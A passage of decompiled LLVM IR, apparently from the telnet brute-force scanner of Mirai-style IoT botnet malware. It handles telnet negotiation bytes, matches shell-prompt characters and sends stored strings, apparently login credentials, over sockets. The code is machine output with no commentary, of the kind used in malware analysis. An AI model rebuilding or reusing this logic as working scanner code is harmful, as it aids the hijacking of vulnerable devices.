  %v3_10680 = load i32, i32* %v2_10680, align 4
  store i32 %v3_10680, i32* %r0.global-to-local, align 4
  %v4_10684 = call i32 @__libc_send(i32 %v3_10680, i32 %v3_10670, i32 %v3_10674, i32 16384)
  store i32 %v4_10684, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10694 = load i32, i32* @r5, align 4
  %v1_10694 = add i32 %v0_10694, 4
  %v2_10694 = inttoptr i32 %v1_10694 to i32*
  %v3_10694 = load i32, i32* %v2_10694, align 4
  store i32 %v3_10694, i32* %r0.global-to-local, align 4
  %v4_10698 = call i32 @__libc_send(i32 %v3_10694, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32 2, i32 16384)
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_106a0 = call i32 @table_lock_val(i32 25)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_106a8 = load i32, i32* @r5, align 4
  %v2_106a8 = add i32 %v1_106a8, 12
  %v3_106a8 = inttoptr i32 %v2_106a8 to i32*
  store i32 6, i32* %v3_106a8, align 4
  br label %dec_label_pc_101a4

dec_label_pc_106b0:                               ; preds = %dec_label_pc_10084
  %v1_106b0 = add i32 %v0_10084, 24
  %v2_106b0 = inttoptr i32 %v1_106b0 to i32*
  %v3_106b0 = load i32, i32* %v2_106b0, align 4
  store i32 %v3_106b0, i32* %r2.global-to-local, align 4
  %v1_106b4 = add i32 %v3_106b0, -1
  store i32 %v1_106b4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_106b8 = icmp eq i32 %v1_106b4, 0
  store i1 %v2_106b8, i1* %cpsr_z.global-to-local, align 1
  %tmp408 = icmp slt i32 %v1_106b4, 1
  br i1 %tmp408, label %dec_label_pc_1072c, label %dec_label_pc_106c0

dec_label_pc_106c0:                               ; preds = %dec_label_pc_106b0
  %v2_106c0 = add i32 %v1_106b4, %v0_10084
  store i32 %v2_106c0, i32* %r3.global-to-local, align 4
  %v1_106c4 = add i32 %v2_106c0, 28
  %v2_106c4 = inttoptr i32 %v1_106c4 to i8*
  %v3_106c4 = load i8, i8* %v2_106c4, align 1
  %v4_106c4 = zext i8 %v3_106c4 to i32
  store i32 %v4_106c4, i32* %r3.global-to-local, align 4
  %v2_106c8 = icmp ugt i8 %v3_106c4, 61
  store i1 %v2_106c8, i1* %cpsr_c.global-to-local, align 1
  %v7_106c8 = icmp eq i8 %v3_106c4, 62
  store i1 %v7_106c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106c8, label %dec_label_pc_109e4, label %bb409

bb409:                                            ; preds = %dec_label_pc_106c0
  %v3_106cc = icmp ugt i8 %v3_106c4, 57
  store i1 %v3_106cc, i1* %cpsr_c.global-to-local, align 1
  %v8_106cc = icmp eq i8 %v3_106c4, 58
  store i1 %v8_106cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_106cc, label %dec_label_pc_109e4, label %dec_label_pc_106d4

dec_label_pc_106d4:                               ; preds = %bb409
  %v2_106d4 = icmp ugt i8 %v3_106c4, 35
  store i1 %v2_106d4, i1* %cpsr_c.global-to-local, align 1
  %v7_106d4 = icmp eq i8 %v3_106c4, 36
  store i1 %v7_106d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106d4, label %dec_label_pc_109e4, label %dec_label_pc_106dc

dec_label_pc_106dc:                               ; preds = %dec_label_pc_106d4
  %v2_106dc = icmp ugt i8 %v3_106c4, 34
  store i1 %v2_106dc, i1* %cpsr_c.global-to-local, align 1
  %v7_106dc = icmp eq i8 %v3_106c4, 35
  store i1 %v7_106dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106dc, label %dec_label_pc_109e4, label %dec_label_pc_106e4

dec_label_pc_106e4:                               ; preds = %dec_label_pc_106dc
  %v2_106e4 = icmp ugt i8 %v3_106c4, 36
  store i1 %v2_106e4, i1* %cpsr_c.global-to-local, align 1
  %v7_106e4 = icmp eq i8 %v3_106c4, 37
  store i1 %v7_106e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106e4, label %dec_label_pc_109e4, label %dec_label_pc_10724.preheader

dec_label_pc_10724.preheader:                     ; preds = %dec_label_pc_106e4
  %v3_106e8 = add i32 %v0_10084, 28
  %v2_106ec = add i32 %v3_106e8, %v3_106b0
  store i32 %v2_106ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10724

dec_label_pc_106f8:                               ; preds = %dec_label_pc_10724
  %v1_106f8 = add i32 %v0_1071c, -2
  %v2_106f8 = inttoptr i32 %v1_106f8 to i8*
  %v3_106f8 = load i8, i8* %v2_106f8, align 1
  %v4_106f8 = zext i8 %v3_106f8 to i32
  store i32 %v4_106f8, i32* %r2.global-to-local, align 4
  %v2_106fc = icmp ugt i8 %v3_106f8, 61
  store i1 %v2_106fc, i1* %cpsr_c.global-to-local, align 1
  %v7_106fc = icmp eq i8 %v3_106f8, 62
  store i1 %v7_106fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_106fc, label %dec_label_pc_109e4, label %bb410

bb410:                                            ; preds = %dec_label_pc_106f8
  %v3_10700 = icmp ugt i8 %v3_106f8, 57
  store i1 %v3_10700, i1* %cpsr_c.global-to-local, align 1
  %v8_10700 = icmp eq i8 %v3_106f8, 58
  store i1 %v8_10700, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10700, label %dec_label_pc_109e4, label %dec_label_pc_10708

dec_label_pc_10708:                               ; preds = %bb410
  %v2_10708 = icmp ugt i8 %v3_106f8, 35
  store i1 %v2_10708, i1* %cpsr_c.global-to-local, align 1
  %v7_10708 = icmp eq i8 %v3_106f8, 36
  store i1 %v7_10708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10708, label %dec_label_pc_109e4, label %dec_label_pc_10710

dec_label_pc_10710:                               ; preds = %dec_label_pc_10708
  %v2_10710 = icmp ugt i8 %v3_106f8, 34
  store i1 %v2_10710, i1* %cpsr_c.global-to-local, align 1
  %v7_10710 = icmp eq i8 %v3_106f8, 35
  store i1 %v7_10710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10710, label %dec_label_pc_109e4, label %dec_label_pc_10718

dec_label_pc_10718:                               ; preds = %dec_label_pc_10710
  %v2_10718 = icmp ugt i8 %v3_106f8, 36
  store i1 %v2_10718, i1* %cpsr_c.global-to-local, align 1
  %v7_10718 = icmp eq i8 %v3_106f8, 37
  store i1 %v7_10718, i1* %cpsr_z.global-to-local, align 1
  %v1_1071c = add i32 %v0_1071c, -1
  store i32 %v1_1071c, i32* %r3.global-to-local, align 4
  br i1 %v7_10718, label %dec_label_pc_109e4, label %dec_label_pc_10724

dec_label_pc_10724:                               ; preds = %dec_label_pc_10724.preheader, %dec_label_pc_10718
  %v0_1071c = phi i32 [ %v2_106ec, %dec_label_pc_10724.preheader ], [ %v1_1071c, %dec_label_pc_10718 ]
  %v0_10724 = phi i32 [ %v1_106b4, %dec_label_pc_10724.preheader ], [ %v1_10724, %dec_label_pc_10718 ]
  %v1_10724 = add i32 %v0_10724, -1
  store i32 %v1_10724, i32* %r0.global-to-local, align 4
  %v2_10724 = icmp ne i32 %v0_10724, 0
  store i1 %v2_10724, i1* %cpsr_c.global-to-local, align 1
  %v7_10724 = icmp eq i32 %v0_10724, 1
  store i1 %v7_10724, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10724, label %dec_label_pc_1072c, label %dec_label_pc_106f8

dec_label_pc_1072c:                               ; preds = %dec_label_pc_10724, %dec_label_pc_106b0
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_10730 = call i32 @table_unlock_val(i32 32)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_10738 = call i32 @table_unlock_val(i32 33)
  store i32 %v2_10740, i32* %r1.global-to-local, align 4
  store i32 32, i32* %r0.global-to-local, align 4
  %v3_10748 = call i32 @table_retrieve_val(i32 32, i32* nonnull %stack_var_-60)
  store i32 %v3_10748, i32* @r4, align 4
  store i32 %v2_10754, i32* %r1.global-to-local, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v3_1075c = call i32 @table_retrieve_val(i32 33, i32* %v2_1075c)
  %v3_10760 = load i32, i32* %stack_var_-60, align 4
  %sext = mul i32 %v3_1075c, 16777216
  %v1_10764 = sdiv i32 %sext, 16777216
  store i32 %v1_10764, i32* @r6, align 4
  %v0_10768 = load i32, i32* @r4, align 4
  store i32 %v0_10768, i32* %r2.global-to-local, align 4
  %v1_1076c = add i32 %v3_10760, -1
  store i32 %v1_1076c, i32* %r3.global-to-local, align 4
  %v0_10770 = load i32, i32* @sl, align 4
  store i32 %v0_10770, i32* %r0.global-to-local, align 4
  %v0_10774 = load i32, i32* @r5, align 4
  %v1_10774 = add i32 %v0_10774, 24
  %v2_10774 = inttoptr i32 %v1_10774 to i32*
  %v3_10774 = load i32, i32* %v2_10774, align 4
  store i32 %v3_10774, i32* %r1.global-to-local, align 4
  %v4_10778 = call i32 @util_memsearch(i32 %v0_10770, i32 %v3_10774, i32 %v0_10768, i32 %v1_1076c)
  store i32 %v4_10778, i32* %r0.global-to-local, align 4
  %v2_1077c = icmp eq i32 %v4_10778, -1
  store i1 %v2_1077c, i1* %cpsr_c.global-to-local, align 1
  %v7_1077c = icmp eq i32 %v4_10778, -1
  store i1 %v7_1077c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1077c, label %dec_label_pc_10b20, label %dec_label_pc_1078c

dec_label_pc_1078c:                               ; preds = %dec_label_pc_10b20, %dec_label_pc_1072c
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_10790 = call i32 @table_lock_val(i32 32)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_10798 = call i32 @table_lock_val(i32 33)
  store i32 %v1_10798, i32* %r0.global-to-local, align 4
  %v0_1079c = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1079c = icmp eq i32 %v0_1079c, 0
  store i1 %v2_1079c, i1* %cpsr_z.global-to-local, align 1
  %tmp411 = icmp slt i32 %v0_1079c, 1
  br i1 %tmp411, label %dec_label_pc_10890, label %dec_label_pc_1078c.dec_label_pc_109e8_crit_edge

dec_label_pc_1078c.dec_label_pc_109e8_crit_edge:  ; preds = %dec_label_pc_1078c
  %v0_109e8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_109e8

dec_label_pc_107a8:                               ; preds = %dec_label_pc_10084
  %v1_107a8 = add i32 %v0_10084, 24
  %v2_107a8 = inttoptr i32 %v1_107a8 to i32*
  %v3_107a8 = load i32, i32* %v2_107a8, align 4
  store i32 %v3_107a8, i32* %r2.global-to-local, align 4
  %v1_107ac = add i32 %v3_107a8, -1
  store i32 %v1_107ac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_107b0 = icmp eq i32 %v1_107ac, 0
  store i1 %v2_107b0, i1* %cpsr_z.global-to-local, align 1
  %tmp412 = icmp slt i32 %v1_107ac, 1
  br i1 %tmp412, label %dec_label_pc_10814, label %dec_label_pc_107b8

dec_label_pc_107b8:                               ; preds = %dec_label_pc_107a8
  %v2_107b8 = add i32 %v1_107ac, %v0_10084
  store i32 %v2_107b8, i32* %r3.global-to-local, align 4
  %v1_107bc = add i32 %v2_107b8, 28
  %v2_107bc = inttoptr i32 %v1_107bc to i8*
  %v3_107bc = load i8, i8* %v2_107bc, align 1
  %v4_107bc = zext i8 %v3_107bc to i32
  store i32 %v4_107bc, i32* %r3.global-to-local, align 4
  %v2_107c0 = icmp ugt i8 %v3_107bc, 61
  store i1 %v2_107c0, i1* %cpsr_c.global-to-local, align 1
  %v7_107c0 = icmp eq i8 %v3_107bc, 62
  store i1 %v7_107c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107c0, label %dec_label_pc_109dc, label %bb413

bb413:                                            ; preds = %dec_label_pc_107b8
  %v3_107c4 = icmp ugt i8 %v3_107bc, 57
  store i1 %v3_107c4, i1* %cpsr_c.global-to-local, align 1
  %v8_107c4 = icmp eq i8 %v3_107bc, 58
  store i1 %v8_107c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_107c4, label %dec_label_pc_109dc, label %dec_label_pc_107cc

dec_label_pc_107cc:                               ; preds = %bb413
  %v2_107cc = icmp ugt i8 %v3_107bc, 35
  store i1 %v2_107cc, i1* %cpsr_c.global-to-local, align 1
  %v7_107cc = icmp eq i8 %v3_107bc, 36
  store i1 %v7_107cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107cc, label %dec_label_pc_109dc, label %dec_label_pc_107d4

dec_label_pc_107d4:                               ; preds = %dec_label_pc_107cc
  %v2_107d4 = icmp ugt i8 %v3_107bc, 34
  store i1 %v2_107d4, i1* %cpsr_c.global-to-local, align 1
  %v7_107d4 = icmp eq i8 %v3_107bc, 35
  store i1 %v7_107d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107d4, label %dec_label_pc_109dc, label %dec_label_pc_1080c.preheader

dec_label_pc_1080c.preheader:                     ; preds = %dec_label_pc_107d4
  %v3_107d8 = add i32 %v0_10084, 28
  %v2_107dc = add i32 %v3_107d8, %v3_107a8
  store i32 %v2_107dc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1080c

dec_label_pc_107e8:                               ; preds = %dec_label_pc_1080c
  %v1_107e8 = add i32 %v0_10804, -2
  %v2_107e8 = inttoptr i32 %v1_107e8 to i8*
  %v3_107e8 = load i8, i8* %v2_107e8, align 1
  %v4_107e8 = zext i8 %v3_107e8 to i32
  store i32 %v4_107e8, i32* %r2.global-to-local, align 4
  %v2_107ec = icmp ugt i8 %v3_107e8, 61
  store i1 %v2_107ec, i1* %cpsr_c.global-to-local, align 1
  %v7_107ec = icmp eq i8 %v3_107e8, 62
  store i1 %v7_107ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107ec, label %dec_label_pc_109dc, label %bb414

bb414:                                            ; preds = %dec_label_pc_107e8
  %v3_107f0 = icmp ugt i8 %v3_107e8, 57
  store i1 %v3_107f0, i1* %cpsr_c.global-to-local, align 1
  %v8_107f0 = icmp eq i8 %v3_107e8, 58
  store i1 %v8_107f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_107f0, label %dec_label_pc_109dc, label %dec_label_pc_107f8

dec_label_pc_107f8:                               ; preds = %bb414
  %v2_107f8 = icmp ugt i8 %v3_107e8, 35
  store i1 %v2_107f8, i1* %cpsr_c.global-to-local, align 1
  %v7_107f8 = icmp eq i8 %v3_107e8, 36
  store i1 %v7_107f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107f8, label %dec_label_pc_109dc, label %dec_label_pc_10800

dec_label_pc_10800:                               ; preds = %dec_label_pc_107f8
  %v2_10800 = icmp ugt i8 %v3_107e8, 34
  store i1 %v2_10800, i1* %cpsr_c.global-to-local, align 1
  %v7_10800 = icmp eq i8 %v3_107e8, 35
  store i1 %v7_10800, i1* %cpsr_z.global-to-local, align 1
  %v1_10804 = add i32 %v0_10804, -1
  store i32 %v1_10804, i32* %r3.global-to-local, align 4
  br i1 %v7_10800, label %dec_label_pc_109dc, label %dec_label_pc_1080c

dec_label_pc_1080c:                               ; preds = %dec_label_pc_1080c.preheader, %dec_label_pc_10800
  %v0_10804 = phi i32 [ %v2_107dc, %dec_label_pc_1080c.preheader ], [ %v1_10804, %dec_label_pc_10800 ]
  %v0_1080c = phi i32 [ %v1_107ac, %dec_label_pc_1080c.preheader ], [ %v1_1080c, %dec_label_pc_10800 ]
  %v1_1080c = add i32 %v0_1080c, -1
  store i32 %v1_1080c, i32* %r0.global-to-local, align 4
  %v2_1080c = icmp ne i32 %v0_1080c, 0
  store i1 %v2_1080c, i1* %cpsr_c.global-to-local, align 1
  %v7_1080c = icmp eq i32 %v0_1080c, 1
  store i1 %v7_1080c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1080c, label %dec_label_pc_10814, label %dec_label_pc_107e8

dec_label_pc_10814:                               ; preds = %dec_label_pc_1080c, %dec_label_pc_107a8
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_10818 = call i32 @table_unlock_val(i32 31)
  store i32 %v2_10754, i32* %r1.global-to-local, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v3_10828 = call i32 @table_retrieve_val(i32 31, i32* %v2_1075c)
  %v3_1082c = load i8, i8* %stack_var_-56, align 1
  %v4_1082c = sext i8 %v3_1082c to i32
  store i32 %v3_10828, i32* %r2.global-to-local, align 4
  %v1_10834 = add nsw i32 %v4_1082c, -1
  store i32 %v1_10834, i32* %r3.global-to-local, align 4
  %v0_10838 = load i32, i32* @sl, align 4
  store i32 %v0_10838, i32* %r0.global-to-local, align 4
  %v0_1083c = load i32, i32* @r5, align 4
  %v1_1083c = add i32 %v0_1083c, 24
  %v2_1083c = inttoptr i32 %v1_1083c to i32*
  %v3_1083c = load i32, i32* %v2_1083c, align 4
  store i32 %v3_1083c, i32* %r1.global-to-local, align 4
  %v4_10840 = call i32 @util_memsearch(i32 %v0_10838, i32 %v3_1083c, i32 %v3_10828, i32 %v1_10834)
  store i32 %v4_10840, i32* %r0.global-to-local, align 4
  %v1_10844 = add i32 %v4_10840, 1
  store i32 %v1_10844, i32* @r7, align 4
  %v2_10844 = icmp eq i32 %v4_10840, -1
  store i1 %v2_10844, i1* %cpsr_c.global-to-local, align 1
  %v7_10844 = icmp eq i32 %v1_10844, 0
  store i1 %v7_10844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10844, label %thread-pre-split103, label %bb415

bb415:                                            ; preds = %dec_label_pc_10814
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split103

thread-pre-split103:                              ; preds = %dec_label_pc_10814, %bb415
  %v0_1084c = phi i1 [ false, %bb415 ], [ true, %dec_label_pc_10814 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_1084c, i1* %cpsr_z.global-to-local, align 1
  store i32 31, i32* %r0.global-to-local, align 4
  %v1_10c50 = call i32 @table_lock_val(i32 31)
  store i32 %v1_10c50, i32* %r0.global-to-local, align 4
  %v0_10c54 = load i32, i32* @r5, align 4
  br i1 %v0_1084c, label %dec_label_pc_10c4c, label %dec_label_pc_1085c

dec_label_pc_1085c:                               ; preds = %thread-pre-split103, %dec_label_pc_109dc
  %v0_1085c = phi i32 [ %v0_10084, %dec_label_pc_109dc ], [ %v0_10c54, %thread-pre-split103 ]
  %v1_1085c = inttoptr i32 %v0_1085c to i32*
  %v2_1085c = load i32, i32* %v1_1085c, align 4
  store i32 %v2_1085c, i32* %r3.global-to-local, align 4
  %v1_10860 = add i32 %v0_1085c, 4
  %v2_10860 = inttoptr i32 %v1_10860 to i32*
  %v3_10860 = load i32, i32* %v2_10860, align 4
  store i32 %v3_10860, i32* %r0.global-to-local, align 4
  %v1_10864 = add i32 %v2_1085c, 13
  %v2_10864 = inttoptr i32 %v1_10864 to i8*
  %v3_10864 = load i8, i8* %v2_10864, align 1
  %v4_10864 = zext i8 %v3_10864 to i32
  store i32 %v4_10864, i32* %r2.global-to-local, align 4
  %v1_10868 = add i32 %v2_1085c, 4
  %v2_10868 = inttoptr i32 %v1_10868 to i32*
  %v3_10868 = load i32, i32* %v2_10868, align 4
  store i32 %v3_10868, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10870 = call i32 @__libc_send(i32 %v3_10860, i32 %v3_10868, i32 %v4_10864, i32 16384)
  store i32 %v4_10870, i32* %r0.global-to-local, align 4
  %v0_10874 = load i32, i32* @r5, align 4
  %v1_10874 = add i32 %v0_10874, 4
  %v2_10874 = inttoptr i32 %v1_10874 to i32*
  %v3_10874 = load i32, i32* %v2_10874, align 4
  store i32 %v3_10874, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10884 = call i32 @__libc_send(i32 %v3_10874, i32 ptrtoint ([3 x i8]* @global_var_1a77c.43 to i32), i32 2, i32 16384)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_1088c = load i32, i32* @r5, align 4
  %v2_1088c = add i32 %v1_1088c, 12
  %v3_1088c = inttoptr i32 %v2_1088c to i32*
  store i32 5, i32* %v3_1088c, align 4
  br label %dec_label_pc_10890

dec_label_pc_10890:                               ; preds = %dec_label_pc_1095c, %bb419, %dec_label_pc_1078c, %dec_label_pc_10a6c, %dec_label_pc_109e8, %dec_label_pc_10ab0, %dec_label_pc_1085c
  %v0_10890 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10890 = icmp eq i32 %v0_10890, 0
  store i1 %v2_10890, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10890, label %dec_label_pc_10004.loopexit, label %dec_label_pc_101a4

dec_label_pc_1089c:                               ; preds = %dec_label_pc_10084
  %v1_1089c = add i32 %v0_10084, 24
  %v2_1089c = inttoptr i32 %v1_1089c to i32*
  %v3_1089c = load i32, i32* %v2_1089c, align 4
  store i32 %v3_1089c, i32* %r2.global-to-local, align 4
  %v0_108a0 = load i32, i32* @sl, align 4
  store i32 %v0_108a0, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_108a8146 = icmp eq i32 %v3_1089c, 0
  store i1 %v3_108a8146, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_108a8146, i1* %cpsr_z.global-to-local, align 1
  %v6_108ac153 = icmp sgt i32 %v3_1089c, 0
  br i1 %v6_108ac153, label %dec_label_pc_108b0.preheader, label %dec_label_pc_1095c

dec_label_pc_108a8.loopexit:                      ; preds = %dec_label_pc_108cc
  %v2_108d4 = add i32 %v1_108d4, 2
  store i32 %v2_108d4, i32* @r4, align 4
  %v2_108d8 = add i32 %v1_108d8, 2
  store i32 %v2_108d8, i32* @r7, align 4
  %v3_108a8 = icmp uge i32 %v2_108d8, %v1_108a8
  store i1 %v3_108a8, i1* %cpsr_c.global-to-local, align 1
  %v9_108a8 = icmp eq i32 %v2_108d8, %v1_108a8
  store i1 %v9_108a8, i1* %cpsr_z.global-to-local, align 1
  %v6_108ac = icmp slt i32 %v2_108d8, %v1_108a8
  br i1 %v6_108ac, label %dec_label_pc_108b0.preheader, label %dec_label_pc_1095c

dec_label_pc_108b0.preheader:                     ; preds = %dec_label_pc_1089c, %dec_label_pc_108a8.loopexit
  %v6_10964239 = phi i32 [ %v6_10964240, %dec_label_pc_108a8.loopexit ], [ %v0_10084, %dec_label_pc_1089c ]
  %v1_108d8222 = phi i32 [ %v2_108d8, %dec_label_pc_108a8.loopexit ], [ 0, %dec_label_pc_1089c ]
  %v1_108bc220 = phi i32 [ %v1_108a8, %dec_label_pc_108a8.loopexit ], [ %v3_1089c, %dec_label_pc_1089c ]
  %v0_108b0218 = phi i32 [ %v2_108d4, %dec_label_pc_108a8.loopexit ], [ %v0_108a0, %dec_label_pc_1089c ]
  br label %dec_label_pc_108b0

dec_label_pc_108b0:                               ; preds = %dec_label_pc_108b0.preheader, %dec_label_pc_10940
  %v6_10964240 = phi i32 [ %v6_10964239, %dec_label_pc_108b0.preheader ], [ %v0_10948, %dec_label_pc_10940 ]
  %v1_108d8 = phi i32 [ %v1_108d8222, %dec_label_pc_108b0.preheader ], [ %v1_1094c, %dec_label_pc_10940 ]
  %v1_108a8 = phi i32 [ %v1_108bc220, %dec_label_pc_108b0.preheader ], [ %v3_10948, %dec_label_pc_10940 ]
  %v1_108d4 = phi i32 [ %v0_108b0218, %dec_label_pc_108b0.preheader ], [ %v1_10954, %dec_label_pc_10940 ]
  %v1_108b0 = inttoptr i32 %v1_108d4 to i8*
  %v2_108b0 = load i8, i8* %v1_108b0, align 1
  %v3_108b0 = zext i8 %v2_108b0 to i32
  store i32 %v3_108b0, i32* @r3, align 4
  %v2_108b4 = icmp eq i8 %v2_108b0, -1
  store i1 %v2_108b4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_108b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_108b4, label %dec_label_pc_108bc, label %dec_label_pc_1095c

dec_label_pc_108bc:                               ; preds = %dec_label_pc_108b0
  %v0_108bc = load i32, i32* @sl, align 4
  %v2_108bc = add i32 %v0_108bc, %v1_108a8
  store i32 %v2_108bc, i32* %r1.global-to-local, align 4
  %v1_108c0 = add i32 %v1_108d4, 1
  store i32 %v1_108c0, i32* @r6, align 4
  %v3_108c4 = icmp uge i32 %v2_108bc, %v1_108c0
  store i1 %v3_108c4, i1* %cpsr_c.global-to-local, align 1
  %v9_108c4 = icmp eq i32 %v2_108bc, %v1_108c0
  store i1 %v9_108c4, i1* %cpsr_z.global-to-local, align 1
  %v2_108c8 = xor i1 %v3_108c4, true
  %v3_108c8 = or i1 %v9_108c4, %v2_108c8
  br i1 %v3_108c8, label %dec_label_pc_1095c, label %dec_label_pc_108cc

dec_label_pc_108cc:                               ; preds = %dec_label_pc_108bc
  %v2_108cc = inttoptr i32 %v1_108c0 to i8*
  %v3_108cc = load i8, i8* %v2_108cc, align 1
  %v4_108cc = zext i8 %v3_108cc to i32
  store i32 %v4_108cc, i32* @r3, align 4
  %v2_108d0 = icmp eq i8 %v3_108cc, -1
  store i1 %v2_108d0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_108d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_108d0, label %dec_label_pc_108a8.loopexit, label %dec_label_pc_108e0

dec_label_pc_108e0:                               ; preds = %dec_label_pc_108cc
  %v2_108e0 = icmp ugt i8 %v3_108cc, -4
  store i1 %v2_108e0, i1* %cpsr_c.global-to-local, align 1
  %v7_108e0 = icmp eq i8 %v3_108cc, -3
  store i1 %v7_108e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108e0, label %dec_label_pc_1096c, label %dec_label_pc_108e8

dec_label_pc_108e8:                               ; preds = %dec_label_pc_108e0
  %v1_108e8 = add i32 %v1_108d4, 2
  store i32 %v1_108e8, i32* @r3, align 4
  %v3_108ec = icmp uge i32 %v2_108bc, %v1_108e8
  store i1 %v3_108ec, i1* %cpsr_c.global-to-local, align 1
  %v9_108ec = icmp eq i32 %v2_108bc, %v1_108e8
  store i1 %v9_108ec, i1* %cpsr_z.global-to-local, align 1
  %v2_108f0 = xor i1 %v3_108ec, true
  %v3_108f0 = or i1 %v9_108ec, %v2_108f0
  br i1 %v3_108f0, label %dec_label_pc_1095c, label %dec_label_pc_108f4

dec_label_pc_108f4:                               ; preds = %dec_label_pc_109cc, %bb420, %dec_label_pc_108e8, %.thread115
  %v0_108f4 = load i32, i32* @r6, align 4
  %v1_108f4 = inttoptr i32 %v0_108f4 to i8*
  %v2_108f4 = load i8, i8* %v1_108f4, align 1
  %v3_108f4 = zext i8 %v2_108f4 to i32
  store i32 %v3_108f4, i32* %r3.global-to-local, align 4
  %v2_108f8 = icmp ugt i8 %v2_108f4, -4
  store i1 %v2_108f8, i1* %cpsr_c.global-to-local, align 1
  %v7_108f8 = icmp eq i8 %v2_108f4, -3
  store i1 %v7_108f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_108f8, label %.thread107, label %dec_label_pc_10908

.thread107:                                       ; preds = %dec_label_pc_108f4
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_108f4, align 1
  %v0_10904.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10904.pr.pr, label %.thread110, label %.thread107.dec_label_pc_10908thread-pre-split_crit_edge

.thread107.dec_label_pc_10908thread-pre-split_crit_edge: ; preds = %.thread107
  %v0_10908.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10908

dec_label_pc_10908:                               ; preds = %dec_label_pc_108f4, %.thread107.dec_label_pc_10908thread-pre-split_crit_edge
  %v0_10908.pr = phi i32 [ %v0_10908.pr.pre, %.thread107.dec_label_pc_10908thread-pre-split_crit_edge ], [ %v3_108f4, %dec_label_pc_108f4 ]
  %v2_10908 = icmp ugt i32 %v0_10908.pr, 250
  store i1 %v2_10908, i1* %cpsr_c.global-to-local, align 1
  %v7_10908 = icmp eq i32 %v0_10908.pr, 251
  store i1 %v7_10908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10908, label %bb416, label %.thread110

bb416:                                            ; preds = %dec_label_pc_10908
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_10910 = load i32, i32* @r6, align 4
  %v4_10910 = inttoptr i32 %v3_10910 to i8*
  store i8 -3, i8* %v4_10910, align 1
  br label %.thread110

.thread110:                                       ; preds = %dec_label_pc_10908, %.thread107, %bb416
  %v0_10914 = load i32, i32* @r4, align 4
  %v1_10914 = add i32 %v0_10914, 2
  %v2_10914 = inttoptr i32 %v1_10914 to i8*
  %v3_10914 = load i8, i8* %v2_10914, align 1
  %v4_10914 = zext i8 %v3_10914 to i32
  store i32 %v4_10914, i32* %r3.global-to-local, align 4
  %v2_10918 = icmp ugt i8 %v3_10914, -4
  store i1 %v2_10918, i1* %cpsr_c.global-to-local, align 1
  %v7_10918 = icmp eq i8 %v3_10914, -3
  store i1 %v7_10918, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10918, label %.thread111, label %dec_label_pc_10928

.thread111:                                       ; preds = %.thread110
  store i32 -4, i32* %r3.global-to-local, align 4
